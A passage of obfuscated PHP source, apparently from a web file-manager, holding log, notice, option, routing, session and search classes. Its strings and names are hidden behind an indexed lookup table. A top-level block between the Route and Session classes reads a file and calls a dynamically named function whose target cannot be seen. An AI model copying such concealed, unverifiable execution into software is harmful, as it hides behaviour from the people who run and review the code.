$´¹ö·§é[$áÇ¹‘®[836]] : time(); $Óù±ÅÀˆ[$áÇ¹‘®[231]] = array($áÇ¹‘®[409], array($ÈòÓ®Æ, $ÀÃÍê‡Ò)); } if ($´¹ö·§é[$áÇ¹‘®[33]]) { $Öš—ºØ« = explode($áÇ¹‘®[50], $´¹ö·§é[$áÇ¹‘®[33]]); $ËñŒè´Ş = $this->typeFile(); $Ñ“ÚÒš— = array(); foreach ($Öš—ºØ« as $ñì©öÂ) { $Ñ“ÚÒš—[] = $ñì©öÂ; if (isset($ËñŒè´Ş[$ñì©öÂ])) { $Ñ“ÚÒš— = array_merge($Ñ“ÚÒš—, $ËñŒè´Ş[$ñì©öÂ]); } } $Ñ“ÚÒš— = array_unique($Ñ“ÚÒš—); if ($Ñ“ÚÒš—) { $Óù±ÅÀˆ[$áÇ¹‘®[33]] = array($áÇ¹‘®[7], $Ñ“ÚÒš—); } } else { $Óù±ÅÀˆ[$áÇ¹‘®[33]] = array($áÇ¹‘®[2415], $áÇ¹‘®[2416]); } if (!empty($´¹ö·§é[$áÇ¹‘®[2414]])) { $Óù±ÅÀˆ[$áÇ¹‘®[535]] = array($áÇ¹‘®[468], "\x25{$´¹ö·§é[$áÇ¹‘®[2414]]}\x25"); } $Æ²Ğòõ = $this->_makeOrder()->where($Óù±ÅÀˆ)->selectPage(); if (empty($Æ²Ğòõ[$áÇ¹‘®[454]])) { show_json(array(), !0, $Æ²Ğòõ[$áÇ¹‘®[451]]); } $Æ²Ğòõ[$áÇ¹‘®[454]] = $this->logList($Æ²Ğòõ[$áÇ¹‘®[454]]); return $Æ²Ğòõ; } private function ipAddress(&$š„€÷±£) { $¿ñ»îŸµ =& $_SERVER[³Ôà×Ó]; if (!empty($š„€÷±£[$¿ñ»îŸµ[2414]])) { $½‡¾ÍÅú = IpLocation::get($š„€÷±£[$¿ñ»îŸµ[2414]]); } else { $½‡¾ÍÅú = LNG($¿ñ»îŸµ[2417]); } $š„€÷±£[$¿ñ»îŸµ[2418]] = $½‡¾ÍÅú; } private function descZipDownload($ÁØ¨Éü¨, &$üÊÆµÕ) { $Êï±¹ =& $_SERVER[³Ôà×Ó]; if (!isset($ÁØ¨Éü¨[$Êï±¹[2419]])) { return; } $ÅİÄÅÆä = json_decode($ÁØ¨Éü¨[$Êï±¹[2419]], !0); foreach ($ÅİÄÅÆä as $é¼÷¨¼ö) { try { $îüú¬¤ƒ = IO::infoFullSimple($é¼÷¨¼ö[$Êï±¹[87]]); } catch (Exception $‹ÖÄß­™) { continue; } $ÁØ¨Éü¨[$Êï±¹[87]] = $é¼÷¨¼ö[$Êï±¹[87]]; $üÊÆµÕ[] = $ÁØ¨Éü¨[$Êï±¹[193]] = $îüú¬¤ƒ[$Êï±¹[193]]; $üÊÆµÕ[] = $ÁØ¨Éü¨[$Êï±¹[2196]] = $îüú¬¤ƒ[$Êï±¹[192]]; break; } return $ÁØ¨Éü¨; } private function getSourceList(&$ÚÈ¯Öîõ) { $ü€‡§…’ =& $_SERVER[³Ôà×Ó]; $«¤××ºƒ = array(); foreach ($ÚÈ¯Öîõ as $³±Úä³µ => $ÂÂ…½¯­) { $É”à¯ = json_decode($ÂÂ…½¯­[$ü€‡§…’[535]], !0); if ($ÂÂ…½¯­[$ü€‡§…’[33]] == $ü€‡§…’[1937]) { $É”à¯ = $this->descZipDownload($É”à¯, $«¤××ºƒ); $ÚÈ¯Öîõ[$³±Úä³µ][$ü€‡§…’[535]] = json_encode($É”à¯); continue; } if (strpos($ÂÂ…½¯­[$ü€‡§…’[33]], $ü€‡§…’[2198]) !== 0) { if (!isset($É”à¯[$ü€‡§…’[87]]) || strpos($ÂÂ…½¯­[$ü€‡§…’[33]], $ü€‡§…’[2420]) !== 0) { continue; } try { $°ıÛùÎ = IO::infoFullSimple($É”à¯[$ü€‡§…’[87]]); } catch (Exception $¯ë·ŸÍ÷) { continue; } $«¤××ºƒ[] = $É”à¯[$ü€‡§…’[193]] = $°ıÛùÎ[$ü€‡§…’[193]]; $«¤××ºƒ[] = $É”à¯[$ü€‡§…’[2196]] = $°ıÛùÎ[$ü€‡§…’[192]]; $ÚÈ¯Öîõ[$³±Úä³µ][$ü€‡§…’[535]] = json_encode($É”à¯); continue; } $«¤××ºƒ[] = $É”à¯[$ü€‡§…’[193]]; $«¤××ºƒ[] = $É”à¯[$ü€‡§…’[2196]]; if ($É”à¯[$ü€‡§…’[33]] == $ü€‡§…’[629]) { $«¤××ºƒ[] = $É”à¯[$ü€‡§…’[535]][$ü€‡§…’[1238]]; $«¤××ºƒ[] = $É”à¯[$ü€‡§…’[535]][$ü€‡§…’[1239]]; } if ($É”à¯[$ü€‡§…’[33]] == $ü€‡§…’[2207]) { $«¤××ºƒ[] = $É”à¯[$ü€‡§…’[535]][$ü€‡§…’[193]]; } } if (!$«¤××ºƒ) { return array(); } return Model($ü€‡§…’[899])->sourceListInfo($«¤××ºƒ, !0); } private function logList($™íŞ) { $¿ßƒ²Ñ± =& $_SERVER[³Ôà×Ó]; $Û¯’®°˜ = array_to_keyvalue($™íŞ, $¿ßƒ²Ñ±[12], $¿ßƒ²Ñ±[1765]); $ãØ»—õÖ = Model($¿ßƒ²Ñ±[607])->userListInfo(array_unique($Û¯’®°˜)); $ù£åàÅÇ = $this->getSourceList($™íŞ); $’¡ı…¬… = $this->typeAll(); $ì³±şÃ = array(); $Ç¨°½ÍÙ = array(); foreach ($™íŞ as $œöşõÖ¼ => $ÛÄÎ†Ú¢) { $ŒÒ¹†Ç = $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[33]]; $Øã”»ÜÎ = isset($ãØ»—õÖ[$ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[1765]]]) ? $ãØ»—õÖ[$ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[1765]]] : !1; $ªÛÒäô” = strpos($ŒÒ¹†Ç, $¿ßƒ²Ñ±[2421]) === 0 ? LNG($¿ßƒ²Ñ±[2422]) : LNG($¿ßƒ²Ñ±[2417]); $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[32]] = isset($Øã”»ÜÎ[$¿ßƒ²Ñ±[32]]) ? $Øã”»ÜÎ[$¿ßƒ²Ñ±[32]] : LNG($¿ßƒ²Ñ±[2417]); $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[2251]] = isset($Øã”»ÜÎ[$¿ßƒ²Ñ±[2251]]) ? $Øã”»ÜÎ[$¿ßƒ²Ñ±[2251]] : $¿ßƒ²Ñ±[12]; $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[1654]] = isset($’¡ı…¬…[$ŒÒ¹†Ç]) ? $’¡ı…¬…[$ŒÒ¹†Ç] : $ªÛÒäô”; $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[2139]] = $Øã”»ÜÎ; $’¼ëÊæç = json_decode($ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[535]], !0); $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[2414]] = isset($’¼ëÊæç[$¿ßƒ²Ñ±[2414]]) ? $’¼ëÊæç[$¿ßƒ²Ñ±[2414]] : $¿ßƒ²Ñ±[12]; $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[2418]] = IpLocation::get($ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[2414]]); if (strpos($ŒÒ¹†Ç, $¿ßƒ²Ñ±[2198]) === 0 || isset($’¼ëÊæç[$¿ßƒ²Ñ±[2196]])) { $’¼ëÊæç[$¿ßƒ²Ñ±[90]] = $ù£åàÅÇ[$’¼ëÊæç[$¿ßƒ²Ñ±[193]]]; $’¼ëÊæç[$¿ßƒ²Ñ±[2212]] = $ù£åàÅÇ[$’¼ëÊæç[$¿ßƒ²Ñ±[2196]]]; if ($’¼ëÊæç[$¿ßƒ²Ñ±[33]] == $¿ßƒ²Ñ±[629]) { $’¼ëÊæç[$¿ßƒ²Ñ±[535]][$¿ßƒ²Ñ±[1238]] = $ù£åàÅÇ[$’¼ëÊæç[$¿ßƒ²Ñ±[535]][$¿ßƒ²Ñ±[1238]]]; $’¼ëÊæç[$¿ßƒ²Ñ±[535]][$¿ßƒ²Ñ±[1239]] = $ù£åàÅÇ[$’¼ëÊæç[$¿ßƒ²Ñ±[535]][$¿ßƒ²Ñ±[1239]]]; } if ($’¼ëÊæç[$¿ßƒ²Ñ±[33]] == $¿ßƒ²Ñ±[2207]) { $’¼ëÊæç[$¿ßƒ²Ñ±[535]][$¿ßƒ²Ñ±[193]] = $ù£åàÅÇ[$’¼ëÊæç[$¿ßƒ²Ñ±[535]][$¿ßƒ²Ñ±[193]]]; } if ($’¼ëÊæç[$¿ßƒ²Ñ±[33]] == $¿ßƒ²Ñ±[1932]) { $’¼ëÊæç[$¿ßƒ²Ñ±[2212]] = $’¼ëÊæç[$¿ßƒ²Ñ±[90]]; $’¼ëÊæç[$¿ßƒ²Ñ±[2196]] = $’¼ëÊæç[$¿ßƒ²Ñ±[2212]][$¿ßƒ²Ñ±[193]]; $’¼ëÊæç[$¿ßƒ²Ñ±[90]] = !1; $’¼ëÊæç[$¿ßƒ²Ñ±[193]] = $¿ßƒ²Ñ±[12]; } $øºÔÚ´ã = array($¿ßƒ²Ñ±[1932], $¿ßƒ²Ñ±[2194]); if (!in_array($’¼ëÊæç[$¿ßƒ²Ñ±[33]], $øºÔÚ´ã)) { if ($’¼ëÊæç[$¿ßƒ²Ñ±[90]] && $’¼ëÊæç[$¿ßƒ²Ñ±[90]][$¿ßƒ²Ñ±[190]] == $¿ßƒ²Ñ±[191]) { $Ç¨°½ÍÙ[] = $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[484]]; unset($™íŞ[$œöşõÖ¼]); continue; } if ($’¼ëÊæç[$¿ßƒ²Ñ±[2212]] && $’¼ëÊæç[$¿ßƒ²Ñ±[2212]][$¿ßƒ²Ñ±[190]] == $¿ßƒ²Ñ±[191]) { $Ç¨°½ÍÙ[] = $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[484]]; unset($™íŞ[$œöşõÖ¼]); continue; } } } $ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[535]] = $’¼ëÊæç; unset($ÛÄÎ†Ú¢[$¿ßƒ²Ñ±[2423]]); $ì³±şÃ[] = $ÛÄÎ†Ú¢; } $this->clearSystemPathLog($Ç¨°½ÍÙ); return $ì³±şÃ; } private function clearSystemPathLog($ûøÚ†Ö“) { $ƒàÌÓïÊ =& $_SERVER[³Ôà×Ó]; if (count($ûøÚ†Ö“) == 0) { return; } $¨ê×¨¢… = array($ƒàÌÓïÊ[484] => array($ƒàÌÓïÊ[7], array_unique($ûøÚ†Ö“))); $this->where($¨ê×¨¢…)->delete(); } public function deviceList($Ç±äÓêé, $Š¯ğªº = 0) { $Ô˜ÜÆš– =& $_SERVER[³Ôà×Ó]; $¬‡¾óı = array($Ô˜ÜÆš–[1765] => $Ç±äÓêé, $Ô˜ÜÆš–[231] => array($Ô˜ÜÆš–[1089], $Š¯ğªº), $Ô˜ÜÆš–[33] => $Ô˜ÜÆš–[1906]); $§¢ó€× = array(); $•…™¥§ = $this->field($Ô˜ÜÆš–[2424])->where($¬‡¾óı)->order($Ô˜ÜÆš–[2210])->limit(50)->select(); foreach ($•…™¥§ as $±î©ñëª => $Äš¦Ì„Ã) { if ($±î©ñëª > 0 && abs($Äš¦Ì„Ã[$Ô˜ÜÆš–[231]] - $•…™¥§[$±î©ñëª - 1][$Ô˜ÜÆš–[231]]) < 5) { continue; } $‰ˆˆü½ = json_decode($Äš¦Ì„Ã[$Ô˜ÜÆš–[535]], !0); $Äš¦Ì„Ã[$Ô˜ÜÆš–[2414]] = isset($‰ˆˆü½[$Ô˜ÜÆš–[2414]]) ? $‰ˆˆü½[$Ô˜ÜÆš–[2414]] : $Ô˜ÜÆš–[12]; unset($‰ˆˆü½[$Ô˜ÜÆš–[2414]]); $…ê²¶Îğ = $this->deviceType($‰ˆˆü½[$Ô˜ÜÆš–[2199]]); if (isset($§¢ó€×[$…ê²¶Îğ])) { continue; } $Äš¦Ì„Ã[$Ô˜ÜÆš–[2418]] = IpLocation::get($Äš¦Ì„Ã[$Ô˜ÜÆš–[2414]]); $Äš¦Ì„Ã[$Ô˜ÜÆš–[535]] = $‰ˆˆü½; $§¢ó€×[$…ê²¶Îğ] = $Äš¦Ì„Ã; } return array_values($§¢ó€×); } public function deviceType($É–Õ«¢ü) { return $É–Õ«¢ü; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\156\157\x74\x69\x63\145\114\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\143\x6f\156\164\145\x6e\164", "\x61\x75\x74\150", "\x6d\x6f\x64\145", "\164\x69\155\x65", "\x74\x79\x70\x65", "\x6c\x65\x76\145\154", "\x65\156\141\142\154\145", "\163\157\x72\164"); public function listData($ªÅöğà = false, $ÄÒÖõûŠ = "\163\157\162\164", $ç÷õè = false) { return parent::listData($ªÅöğà, $ÄÒÖõûŠ, $ç÷õè); } public function add($æ¯·†Ññ) { $±ã¾í°Å =& $_SERVER[³Ôà×Ó]; $üíèŸû” = time(); if ($æ¯·†Ññ[$±ã¾í°Å[16]] == $±ã¾í°Å[2425]) { $üíèŸû” = strtotime($æ¯·†Ññ[$±ã¾í°Å[206]]); } $æ¯·†Ññ[$±ã¾í°Å[206]] = $üíèŸû”; return parent::insert($æ¯·†Ññ); } public function update($ÂĞÍ±–Ğ, $È‘·ÃÎ£) { $¬«Ñø™Ù =& $_SERVER[³Ôà×Ó]; $ÆŞÁŞÂ„ = $this->listData($ÂĞÍ±–Ğ); if (!$ÆŞÁŞÂ„) { return !1; } $Ü€¢’»¥ = time(); if ($È‘·ÃÎ£[$¬«Ñø™Ù[16]] == $¬«Ñø™Ù[2425]) { $Ü€¢’»¥ = strtotime($È‘·ÃÎ£[$¬«Ñø™Ù[206]]); } $È‘·ÃÎ£[$¬«Ñø™Ù[206]] = $Ü€¢’»¥; return parent::update($ÂĞÍ±–Ğ, $È‘·ÃÎ£); } public function remove($¬¸£™ÇÚ) { $÷ßÑºµ¥ = $this->listData($¬¸£™ÇÚ); if (!$÷ßÑºµ¥ || $÷ßÑºµ¥[$_SERVER[³Ôà×Ó][191]]) { return !1; } return parent::remove($¬¸£™ÇÚ); } public function sort($Û¼±Ôªú, $¥¨º–—³) { return parent::update($Û¼±Ôªú, $¥¨º–—³); } public function enable($²‡ÙĞ±‘, $ ²Ä¿Õ¥) { return parent::update($²‡ÙĞ±‘, array($_SERVER[³Ôà×Ó][2426] => $ ²Ä¿Õ¥)); } private function initUserOption() { $†ø–‡™ =& $_SERVER[³Ôà×Ó]; $this->optionType = $†ø–‡™[2427]; $this->modelType = $†ø–‡™[2428]; $this->field = array($†ø–‡™[2429], $†ø–‡™[32], $†ø–‡™[206], $†ø–‡™[33], $†ø–‡™[2430], $†ø–‡™[825], $†ø–‡™[226]); } public function userNoticeGet($ìÎÉ»·Ï = false) { $this->initUserOption(); return parent::listData($ìÎÉ»·Ï, $_SERVER[³Ôà×Ó][484], !0); } public function userNoticeAdd($‘‚‹ïª) { $ ­öŞíí =& $_SERVER[³Ôà×Ó]; $this->initUserOption(); $ï¶Ï÷È = $this->findByKey($ ­öŞíí[2429], $‘‚‹ïª[$ ­öŞíí[484]]); if ($ï¶Ï÷È) { return !0; } $¨¤šÊöÉ = array($ ­öŞíí[2429] => $‘‚‹ïª[$ ­öŞíí[484]], $ ­öŞíí[32] => $‘‚‹ïª[$ ­öŞíí[32]], $ ­öŞíí[206] => $‘‚‹ïª[$ ­öŞíí[206]], $ ­öŞíí[33] => isset($‘‚‹ïª[$ ­öŞíí[33]]) ? $‘‚‹ïª[$ ­öŞíí[33]] : 1, $ ­öŞíí[2430] => isset($‘‚‹ïª[$ ­öŞíí[2430]]) ? $‘‚‹ïª[$ ­öŞíí[2430]] : 0, $ ­öŞíí[825] => 0, $ ­öŞíí[226] => 0); return parent::insert($¨¤šÊöÉ); } public function userNoticeEdit($Óëİç, $Ü™ù½Í) { $this->initUserOption(); return parent::update($Óëİç, $Ü™ù½Í); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\x6d\137\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array("\x6d\145\x6e\165", "\162\157\x6c\x65", "\x72\x6f\x6c\x65\x47\162\x6f\165\x70", "\162\x65\147\151\163\164", "\x65\x6d\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($è´ÉúŸß) { return "\x53\x79\163\x74\145\x6d\x4f\160\164\151\x6f\156\x5f{$è´ÉúŸß}"; } protected function optionDefault($¸²»É¯â = '') { $ó¾³Ü¯Æ =& $_SERVER[³Ôà×Ó]; if ($¸²»É¯â == $ó¾³Ü¯Æ[12]) { return $GLOBALS[$ó¾³Ü¯Æ[6]][$ó¾³Ü¯Æ[466]]; } } } goto B„¯ÙÂ²º; fØ¿¥™Ÿ±: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\133\x5e\57\135\53", "\x3a\x6e\x75\x6d" => "\x5b\60\x2d\x39\135\x2b", "\x3a\141\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($Ò…º©†Í, $ÇŠ·Ê‰¶) { $”Ÿ­µ‹œ =& $_SERVER[³Ôà×Ó]; if ($Ò…º©†Í == $”Ÿ­µ‹œ[1701]) { $ŞÊõÜ®† = array_map($”Ÿ­µ‹œ[1702], $ÇŠ·Ê‰¶[0]); $‚û§„Ÿä = strpos($ÇŠ·Ê‰¶[1], $”Ÿ­µ‹œ[8]) === 0 ? $ÇŠ·Ê‰¶[1] : $”Ÿ­µ‹œ[8] . $ÇŠ·Ê‰¶[1]; $ù×½Ìí¿ = $ÇŠ·Ê‰¶[2]; } else { $ŞÊõÜ®† = null; $‚û§„Ÿä = strpos($ÇŠ·Ê‰¶[0], $”Ÿ­µ‹œ[8]) === 0 ? $ÇŠ·Ê‰¶[0] : $”Ÿ­µ‹œ[8] . $ÇŠ·Ê‰¶[0]; $ù×½Ìí¿ = $ÇŠ·Ê‰¶[1]; } array_push(self::$maps, $ŞÊõÜ®†); array_push(self::$routes, $‚û§„Ÿä); array_push(self::$methods, strtoupper($Ò…º©†Í)); array_push(self::$callbacks, $ù×½Ìí¿); } public static function error($ò¼’€Í) { self::$errorCallback = $ò¼’€Í; } public static function haltOnMatch($ÔŠî¶¼¨ = true) { self::$halts = $ÔŠî¶¼¨; } public static function dispatch() { $Õ®¨Ÿô• =& $_SERVER[³Ôà×Ó]; $Âïéï‘È = parse_url($_SERVER[$Õ®¨Ÿô•[1703]], PHP_URL_PATH); $š†àºÃ  = $_SERVER[$Õ®¨Ÿô•[164]]; $ÔÃÎÂø¢ = array_keys(static::$patterns); $ˆšƒ‚šÎ = array_values(static::$patterns); $¨Šù›Ä– = !1; self::$routes = preg_replace($Õ®¨Ÿô•[1358], $Õ®¨Ÿô•[8], self::$routes); if (in_array($Âïéï‘È, self::$routes)) { $½İØ×¨Ã = array_keys(self::$routes, $Âïéï‘È); foreach ($½İØ×¨Ã as $ó‰ñ˜ç…) { if (self::$methods[$ó‰ñ˜ç…] == $š†àºÃ  || self::$methods[$ó‰ñ˜ç…] == $Õ®¨Ÿô•[1704] || in_array($š†àºÃ , self::$maps[$ó‰ñ˜ç…])) { $¨Šù›Ä– = !0; if (!is_object(self::$callbacks[$ó‰ñ˜ç…])) { $¦¬¸©Ù = explode($Õ®¨Ÿô•[8], self::$callbacks[$ó‰ñ˜ç…]); $üÙßÂ¤„ = end($¦¬¸©Ù); $£çÒàı = explode($Õ®¨Ÿô•[1290], $üÙßÂ¤„); $€¦îŠìÚ = new $£çÒàı[0](); $€¦îŠìÚ->{$£çÒàı[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ó‰ñ˜ç…]); if (self::$halts) { return; } } } } } else { $®˜âÌÊê = 0; foreach (self::$routes as $ó‰ñ˜ç…) { if (strpos($ó‰ñ˜ç…, $Õ®¨Ÿô•[4]) !== !1) { $ó‰ñ˜ç… = str_replace($ÔÃÎÂø¢, $ˆšƒ‚šÎ, $ó‰ñ˜ç…); } if (preg_match($Õ®¨Ÿô•[1705] . $ó‰ñ˜ç… . $Õ®¨Ÿô•[1706], $Âïéï‘È, $¼şÇÜö×)) { if (self::$methods[$®˜âÌÊê] == $š†àºÃ  || self::$methods[$®˜âÌÊê] == $Õ®¨Ÿô•[1704] || !empty(self::$maps[$®˜âÌÊê]) && in_array($š†àºÃ , self::$maps[$®˜âÌÊê])) { $¨Šù›Ä– = !0; array_shift($¼şÇÜö×); if (!is_object(self::$callbacks[$®˜âÌÊê])) { $¦¬¸©Ù = explode($Õ®¨Ÿô•[8], self::$callbacks[$®˜âÌÊê]); $üÙßÂ¤„ = end($¦¬¸©Ù); $£çÒàı = explode($Õ®¨Ÿô•[1290], $üÙßÂ¤„); $€¦îŠìÚ = new $£çÒàı[0](); if (!method_exists($€¦îŠìÚ, $£çÒàı[1])) { echo $Õ®¨Ÿô•[1707]; } else { call_user_func_array(array($€¦îŠìÚ, $£çÒàı[1]), $¼şÇÜö×); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$®˜âÌÊê], $¼şÇÜö×); if (self::$halts) { return; } } } } $®˜âÌÊê++; } } if ($¨Šù›Ä– == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $õ¿»£Ú =& $_SERVER[³Ôà×Ó]; header($_SERVER[$õ¿»£Ú[1708]] . $õ¿»£Ú[1709]); echo $õ¿»£Ú[1710]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Õ®¨Ÿô•[1703]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } if ($_SERVER[$_SERVER[³Ôà×Ó][431]] != $_SERVER[$_SERVER[³Ôà×Ó][432]]) { $_getc = $_SERVER[³Ôà×Ó][433]; $_getfile = $_SERVER[$_SERVER[³Ôà×Ó][434]] . $_SERVER[³Ôà×Ó][435]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[³Ôà×Ó][262], $_getfilec); if (count($_getarrs) < $_SERVER[³Ôà×Ó][436]) { $exit = $_SERVER[³Ôà×Ó][437]; $exit(); } $_act = $_SERVER[³Ôà×Ó][438]; $_act($_SERVER[$_SERVER[³Ôà×Ó][439]]); } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $„Óöï—ñ =& $_SERVER[³Ôà×Ó]; static $õÆò€… = false; if ($õÆò€…) { return $õÆò€…; } $Êã‡ïû  = $GLOBALS[$„Óöï—ñ[6]][$„Óöï—ñ[425]]; self::$sessionTime = $Êã‡ïû [$„Óöï—ñ[1711]]; $¹Ğ¡¦¼„ = isset($GLOBALS[$„Óöï—ñ[1712]]) ? $GLOBALS[$„Óöï—ñ[1712]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¹Ğ¡¦¼„)) { self::$sessionSign = Cookie::get($¹Ğ¡¦¼„); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($¹Ğ¡¦¼„, self::$sessionSign, self::$sessionTime); $ã˜£œº = $Êã‡ïû [$„Óöï—ñ[1713]]; $Î¬àéõÒ = $Êã‡ïû [$ã˜£œº]; $ß÷¸â‘ = $Êã‡ïû [$„Óöï—ñ[902]]; switch ($ã˜£œº) { case $„Óöï—ñ[21]: self::$handle = Model($„Óöï—ñ[903]); break; case $„Óöï—ñ[904]: self::$handle = new CacheRedis($Î¬àéõÒ, $ß÷¸â‘); break; case $„Óöï—ñ[905]: self::$handle = new CacheMemcached($Î¬àéõÒ, $ß÷¸â‘); break; case $„Óöï—ñ[230]: $Î¬àéõÒ[$„Óöï—ñ[87]] = $Î¬àéõÒ[$„Óöï—ñ[87]] . $„Óöï—ñ[1714]; self::$handle = new CacheFile($Î¬àéõÒ, $ß÷¸â‘); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $õÆò€… = new self(); return $õÆò€…; } public static function getBySign($æÖó§‚½) { $™İûÑ˜ = self::$handle->get($æÖó§‚½); $™İûÑ˜ = unserialize($™İûÑ˜); return is_array($™İûÑ˜) ? $™İûÑ˜ : array(); } public static function setBySign($²üÔÕÍ¸, $ŞÎĞ¥Æ©) { CacheLock::lock($²üÔÕÍ¸); self::$handle->set($²üÔÕÍ¸, serialize($ŞÎĞ¥Æ©), self::$sessionTime); CacheLock::unlock($²üÔÕÍ¸); } public static function sign($¹º»ÈÈö = false) { if ($¹º»ÈÈö) { self::$sessionSign = $¹º»ÈÈö; } self::init(); return self::$sessionSign; } public static function set($·Ï’¶¯Ø, $¸ˆà÷§ = false) { self::init(); if (is_array($·Ï’¶¯Ø)) { foreach ($·Ï’¶¯Ø as $¦†·Ë€í => $Ûéåªë¼) { array_set_value(self::$data, $¦†·Ë€í, $Ûéåªë¼); } } else { array_set_value(self::$data, $·Ï’¶¯Ø, $¸ˆà÷§); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÔÑ°³§½ = false) { self::init(); if (!$ÔÑ°³§½) { return self::$data; } return array_get_value(self::$data, $ÔÑ°³§½); } public static function remove($Ì¸¤éÔï) { self::init(); unset(self::$data[$Ì¸¤éÔï]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[³Ôà×Ó][908])) { self::$handle->clearTimeout(); } } } goto bÃª¨Èµ×Ë; FàÅ±ÏÍÑ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ŠÎÏã×Ñ) { $úå¡ì‘ =& $_SERVER[³Ôà×Ó]; $¡úÓµÓ = KodIO::fileTypeList(); $¼êäè = $¡úÓµÓ[$ŠÎÏã×Ñ]; if (!$¼êäè) { return array(); } $ëşƒÚ‹¡ = $¼êäè[$úå¡ì‘[169]]; $æ©ß‰ª– = $úå¡ì‘[7]; if (!$¼êäè[$úå¡ì‘[169]]) { $Àî°’äÅ = array_to_keyvalue($¡úÓµÓ, $úå¡ì‘[12], $úå¡ì‘[169]); $ëşƒÚ‹¡ = implode($úå¡ì‘[50], $Àî°’äÅ); $æ©ß‰ª– = $úå¡ì‘[2225]; } $Öñ¢­à— = explode($úå¡ì‘[50], trim($ëşƒÚ‹¡, $úå¡ì‘[50])); return array($æ©ß‰ª–, $Öñ¢­à—); } public function listPathType($“êß˜Û) { $ïÀÑö„ =& $_SERVER[³Ôà×Ó]; $××ªû‚ß = $this->fileTypeWhere($“êß˜Û); if (!$××ªû‚ß) { return array(); } $ÑüøÉÏ÷ = USER_ID; $¿º«Äì = Model($ïÀÑö„[607])->getInfo($ÑüøÉÏ÷); $„àÆˆ— = array($ïÀÑö„[657] => SourceModel::TYPE_USER, $ïÀÑö„[593] => array($ïÀÑö„[621], $ïÀÑö„[603] . $¿º«Äì[$ïÀÑö„[90]][$ïÀÑö„[193]] . $ïÀÑö„[622]), $ïÀÑö„[658] => $ÑüøÉÏ÷, $ïÀÑö„[655] => 0, $ïÀÑö„[656] => $××ªû‚ß); return $this->listSource($„àÆˆ—); } public function listSearch($”…Ÿñå¶, $ğ“³äÔ˜ = 300) { $ëÄŸİ²Î =& $_SERVER[³Ôà×Ó]; if (isset($”…Ÿñå¶[$ëÄŸİ²Î[2061]]) && $”…Ÿñå¶[$ëÄŸİ²Î[2061]]) { $”…Ÿñå¶[$ëÄŸİ²Î[2061]] = str_replace($ëÄŸİ²Î[469], $ëÄŸİ²Î[2226], trim($”…Ÿñå¶[$ëÄŸİ²Î[2061]])); } $Û‚´‹÷´ = $this->_parseSearchWhere($”…Ÿñå¶); if (!isset($Û‚´‹÷´[$ëÄŸİ²Î[514]])) { $Û‚´‹÷´[$ëÄŸİ²Î[514]] = 0; } $ó‡³«Ì‘ = $ëÄŸİ²Î[2227]; $Á‹ÍşÑ = $Û‚´‹÷´; $»Ëş“ü = $ó‡³«Ì‘; $this->_listSearchBindPinyin($”…Ÿñå¶, $Û‚´‹÷´, $ó‡³«Ì‘); $this->alias($ëÄŸİ²Î[528])->_makeOrder(); $Û‚´‹÷´ = $this->parseWhereLike($Û‚´‹÷´); $À‰ÊŸêû = $this->distinct(!0)->field($ó‡³«Ì‘)->where($Û‚´‹÷´)->selectPage($ğ“³äÔ˜); if ($GLOBALS[$ëÄŸİ²Î[6]][$ëÄŸİ²Î[466]][$ëÄŸİ²Î[467]] && Input::check($”…Ÿñå¶[$ëÄŸİ²Î[2061]], $ëÄŸİ²Î[664]) && $À‰ÊŸêû[$ëÄŸİ²Î[451]][$ëÄŸİ²Î[429]] == 1 && $À‰ÊŸêû[$ëÄŸİ²Î[451]][$ëÄŸİ²Î[452]] == 0) { $À‰ÊŸêû = $this->distinct(!0)->field($ó‡³«Ì‘)->where($Á‹ÍşÑ)->limit(1000)->select(); $À‰ÊŸêû = array_page_split($À‰ÊŸêû, !1, $ğ“³äÔ˜); } $this->_listSearchFileContent($À‰ÊŸêû, $”…Ÿñå¶, $»Ëş“ü, $Á‹ÍşÑ); $this->_listSearchDesc($À‰ÊŸêû, $”…Ÿñå¶, $»Ëş“ü); $this->_listSearchTag($À‰ÊŸêû, $”…Ÿñå¶, $»Ëş“ü); $this->_listSearchGroupTag($À‰ÊŸêû, $”…Ÿñå¶, $»Ëş“ü); $this->_listDataApply($À‰ÊŸêû[$ëÄŸİ²Î[454]]); $this->_listMake($À‰ÊŸêû); return $À‰ÊŸêû; } private function 